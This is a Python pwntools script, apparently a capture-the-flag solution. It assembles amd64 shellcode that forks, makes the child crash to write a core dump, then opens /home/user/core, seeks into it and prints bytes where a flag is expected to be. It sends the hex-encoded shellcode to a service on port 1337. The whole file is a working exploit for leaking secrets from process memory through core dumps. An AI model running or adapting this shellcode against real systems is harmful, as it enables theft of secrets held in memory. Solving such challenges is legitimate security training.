from pwn import *

context.arch = "amd64"

payload = ""
# Trick to make rsp point at the end of shellcode and use it as buffer to read into
payload += "\tjmp here\n"
payload += "main:\n"
# Fork
payload += "\tmov rax, 0x39\n"
payload += "\tsyscall\n"
# If child, jump somewhere and crash such that we generate a core dump
payload += "\tcmp rax, 0\n"
payload += "\tje  child\n"
# If parent, open coredump, seek to around where flag should be in memory and dump

# First, do a bit of a loop to give a chance for the coredump to be generated
payload += "\tmov rcx, 0x100000000\n"
payload += "loop:\n"
payload += "\tsub rcx, 1\n"
payload += "\tcmp rcx, 0\n"
payload += "\tjne loop\n"
# Open core file
payload += pwnlib.shellcraft.amd64.open("/home/user/core")
# Seek a bit further around where flag should be
payload += "\tmov rdi, rax\n"
payload += "\tmov rsi, 0x6000\n"
payload += "\tmov rdx, 0x0\n"
payload += "\tmov rax, 0x8\n"
payload += "\tsyscall\n"
# Read buffer
payload += "\tmov rsi, rsp\n"
payload += "\tmov rdx, 0x100\n"
payload += "\tmov rax, 0x0\n"
payload += "\tsyscall\n"
# Dump to stdout
payload += "\tmov rdi, 0x1\n"
payload += "\tmov rsi, rsp\n"
payload += "\tmov rdx, 0x100\n"
payload += "\tmov rax, 0x1\n"
payload += "\tsyscall\n"
payload += "child:\n"
payload += "\tmov rax, 0x1234\n"
payload += "\tmov rax, [rax]\n"
payload += "here:\n"
payload += "\tlea rsp, [rip]\n"
payload += "\tadd rsp, 0x20\n"
payload += "\tcall main\n"
print(payload)

payload = asm(payload).hex()
print(payload)

r = remote("0.0.0.0", 1337)
r.recvuntil(": ")
r.sendline(payload)
print(r.recvall())
